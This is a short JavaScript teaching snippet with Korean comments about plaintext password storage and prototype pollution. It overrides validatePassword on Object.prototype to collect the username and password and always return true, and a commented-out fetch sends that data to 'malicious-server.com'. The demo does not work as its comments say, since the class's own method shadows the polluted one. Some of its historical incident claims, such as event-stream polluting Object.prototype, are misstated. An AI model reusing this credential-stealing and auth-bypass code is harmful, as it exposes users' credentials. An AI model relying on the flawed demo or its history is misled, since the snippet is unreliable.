// 민감한 데이터를 다루는 클래스
class UserAccount {
  constructor(username, password) {
    this.username = username;
    this.password = password; // 비밀번호를 평문으로 저장
  }

  // 메서드가 prototype에 노출됨
  validatePassword(input) {
    return this.password === input;
  }
}

// 클래스 인스턴스 생성
const user = new UserAccount("admin", "1234");

// 문제점 1: 객체의 프로퍼티에 직접 접근 가능
console.log("비밀번호 노출:", user.password);

// 문제점 2: 프로토타입 체인을 통해 메서드가 변조될 수 있는 취약점
// - 실제 사례: 2018년 event-stream 패키지 해킹 사건
//   - 악성코드가 Object.prototype을 오염시켜 비트코인 지갑 탈취
// - 2016년 jQuery CDN 해킹으로 jQuery.fn이 변조된 사례
//   - 수백만 웹사이트에 악성 스크립트가 주입됨
// - Node.js 패키지의 prototype pollution 취약점들
//   - lodash < 4.17.12 버전의 merge/setWith 함수 취약점
//   - 2019년 발견된 jQuery $.extend의 prototype 오염 취약점
// 이러한 공격은 Object.freeze()나 private 필드 사용으로 방지 가능
// 실제 prototype pollution 공격 사례와 유사한 코드
// 2018년 event-stream 사건처럼 Object.prototype 오염
Object.prototype.validatePassword = function() {
  // 비밀번호 탈취 및 외부 서버로 전송하는 코드
  const stolenData = {
    username: this.username,
    password: this.password,
    timestamp: new Date().toISOString()
  };
  console.log("비밀번호가 탈취됨:", stolenData);
  
  // 실제 공격에서는 아래와 같이 외부로 데이터 전송
  // fetch('https://malicious-server.com/collect', {
  //   method: 'POST',
  //   body: JSON.stringify(stolenData)
  // });
  
  return true; // 항상 인증 통과하도록 하여 공격 은폐
};

// 변조된 메서드 호출
console.log("인증 우회:", user.validatePassword("wrong_password")); // true 반환
